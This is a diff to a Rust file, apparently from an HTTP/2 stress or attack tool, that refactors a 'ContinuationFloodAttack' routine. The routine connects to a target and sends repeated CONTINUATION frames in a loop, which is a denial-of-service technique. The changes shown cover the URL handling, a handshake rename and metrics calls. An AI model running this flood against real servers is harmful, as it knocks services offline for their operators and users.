@@ -13,10 +13,12 @@
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 
+use async_trait::async_trait;
 use bytes::Bytes;
 use phoenix_core::RawH2Connection;
 use phoenix_metrics::AttackMetrics;
 use tracing::{info, warn, error};
+use url::Url;
 
 use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target};
 
@@ -163,8 +165,11 @@ impl Attack for ContinuationFloodAttack {
         let metrics = ctx.metrics.clone();
         let start_time = Instant::now();
         
-        // Connect to target
-        let mut connection = match RawH2Connection::connect(&target_host, target_port).await {
+        // Connect to target - construct URL from host and port
+        let url_str = format!("https://{}:{}", target_host, target_port);
+        let url = Url::parse(&url_str).map_err(|e| AttackError::Config(format!("Invalid URL: {}", e)))?;
+        
+        let mut connection = match RawH2Connection::connect(&url).await {
             Ok(conn) => conn,
             Err(e) => return Err(AttackError::Connection(e)),
         };
@@ -172,7 +177,7 @@ impl Attack for ContinuationFloodAttack {
         info!("Connected to {}:{}", target_host, target_port);
         
         // Perform TLS and HTTP/2 handshake
-        connection.handshake().await.map_err(AttackError::Connection)?;
+        connection.perform_handshake().await.map_err(AttackError::Connection)?;
         
         let mut total_frames = 0u64;
         let mut errors = 0u64;
@@ -199,7 +204,8 @@ impl Attack for ContinuationFloodAttack {
             }
             
             total_frames += 1;
-            metrics.increment_requests();
+            // Record request with dummy values for now
+            metrics.record_request(0, true, 0).await;
             
             // Send CONTINUATION frames
             for frame_idx in 0..frames_per_stream {
@@ -219,7 +225,7 @@ impl Attack for ContinuationFloodAttack {
                 }
                 
                 total_frames += 1;
-                metrics.increment_requests();
+                metrics.record_request(0, true, 0).await;
                 
                 // Small yield every 1000 frames
                 if total_frames % 1000 == 0 {
@@ -236,7 +242,7 @@ impl Attack for ContinuationFloodAttack {
                     errors += 1;
                 } else {
                     total_frames += 1;
-                    metrics.increment_requests();
+                    metrics.record_request(0, true, 0).await;
                 }
             }
             
@@ -244,7 +250,7 @@ impl Attack for ContinuationFloodAttack {
         }
         
         let actual_duration = start_time.elapsed();
-        let snapshot = metrics.snapshot();
+        let snapshot = metrics.snapshot().await;
         
         info!("Attack completed: {} frames sent, {} errors, duration: {:?}", 
               total_frames, errors, actual_duration);
